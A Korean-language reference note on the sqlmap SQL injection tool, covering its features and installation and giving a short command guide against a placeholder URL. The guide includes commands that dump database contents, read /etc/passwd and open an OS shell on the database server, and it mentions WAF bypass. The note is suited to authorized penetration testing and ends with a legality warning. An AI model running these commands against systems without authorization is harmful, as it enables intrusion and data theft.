---
tags:
  - windows
  - linux
  - mac
  - webapp
  - debugging
  - injection_test
  - web_security
---
## 설명
---
`sqlmap`은 SQL 인젝션 취약점을 자동으로 탐지하고 악용하는 오픈소스 침투 테스트 도구입니다. 데이터베이스 서버의 취약점을 스캔하고, 데이터베이스 내용에 접근하며, 심지어 파일 시스템에 접근하거나 운영체제에서 명령을 실행할 수도 있습니다.

## 설치 영역
---
`sqlmap`은 Python 스크립트이므로, 특정 고정된 설치 경로가 없습니다. 일반적으로 GitHub에서 클론하거나 pip로 설치한 디렉토리에서 실행됩니다.

## 주요 기능
---
- `자동 SQL 인젝션`: 다양한 SQL 인젝션 기술(Boolean-based blind, Time-based blind, Error-based, UNION query-based, Stacked queries, Out-of-band)을 자동으로 탐지하고 악용합니다.
- `데이터베이스 접근`: 데이터베이스 이름, 테이블, 컬럼, 데이터 등을 추출합니다.
- `파일 시스템 접근`: 데이터베이스 서버의 파일 시스템에서 파일을 읽거나 쓸 수 있습니다.
- `운영체제 명령 실행`: 데이터베이스 서버의 운영체제에서 명령을 실행하고 결과를 가져올 수 있습니다.
- `다양한 데이터베이스 지원`: MySQL, Oracle, PostgreSQL, Microsoft SQL Server, IBM DB2, SQLite, Firebird, Sybase, SAP MaxDB, Informix, HSQLDB, H2 등 다양한 데이터베이스를 지원합니다.
- `웹 애플리케이션 방화벽(WAF) 우회`: 다양한 WAF 우회 기술을 내장하고 있습니다.

## 설치 방법
---
`sqlmap`은 Python으로 작성되었으며, GitHub에서 소스 코드를 클론하거나 pip를 통해 설치할 수 있습니다.

1.  **Python 설치**: 시스템에 Python 2.7 또는 Python 3.x가 설치되어 있어야 합니다.

2.  **GitHub에서 클론 (권장)**:
    ```sh
    git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
    ```
    *   클론 후 `sqlmap-dev` 디렉토리로 이동하여 `python sqlmap.py` 명령어로 실행합니다.

3.  **pip로 설치 (일부 기능 제한)**:
    ```sh
    pip install sqlmap
    ```
    *   pip로 설치 시 일부 기능(예: 최신 개발 버전의 기능)이 제한될 수 있습니다.

## 간단 가이드
---
1.  **기본 SQL 인젝션 테스트**: 대상 URL에 대해 SQL 인젝션 취약점을 테스트합니다.
    ```sh
    python sqlmap.py -u "http://example.com/vuln.php?id=1"
    ```

2.  **데이터베이스 목록 추출**: 대상 서버의 데이터베이스 목록을 추출합니다.
    ```sh
    python sqlmap.py -u "http://example.com/vuln.php?id=1" --dbs
    ```

3.  **테이블 목록 추출**: 특정 데이터베이스의 테이블 목록을 추출합니다.
    ```sh
    python sqlmap.py -u "http://example.com/vuln.php?id=1" -D <데이터베이스 이름> --tables
    ```

4.  **컬럼 목록 추출**: 특정 테이블의 컬럼 목록을 추출합니다.
    ```sh
    python sqlmap.py -u "http://example.com/vuln.php?id=1" -D <데이터베이스 이름> -T <테이블 이름> --columns
    ```

5.  **데이터 추출**: 특정 컬럼의 데이터를 추출합니다.
    ```sh
    python sqlmap.py -u "http://example.com/vuln.php?id=1" -D <데이터베이스 이름> -T <테이블 이름> -C <컬럼 이름> --dump
    ```

6.  **파일 읽기**: 데이터베이스 서버의 파일 시스템에서 파일을 읽습니다.
    ```sh
    python sqlmap.py -u "http://example.com/vuln.php?id=1" --file-read "/etc/passwd"
    ```

7.  **운영체제 쉘 접근**: 데이터베이스 서버의 운영체제 쉘에 접근합니다.
    ```sh
    python sqlmap.py -u "http://example.com/vuln.php?id=1" --os-shell
    ```

#### 사용 시 주의 사항
- `sqlmap`은 강력한 침투 테스트 도구이므로, **반드시 소유하거나 명시적으로 허가된 시스템에 대해서만 사용해야 합니다.** 무단 사용은 불법이며 법적 처벌을 받을 수 있습니다.
- 웹 애플리케이션 방화벽(WAF)이나 침입 방지 시스템(IPS)에 의해 탐지될 수 있습니다.

## 관련 URL
---
[sqlmap 공식 웹사이트](http://sqlmap.org/)
[sqlmap GitHub](https://github.com/sqlmapproject/sqlmap)
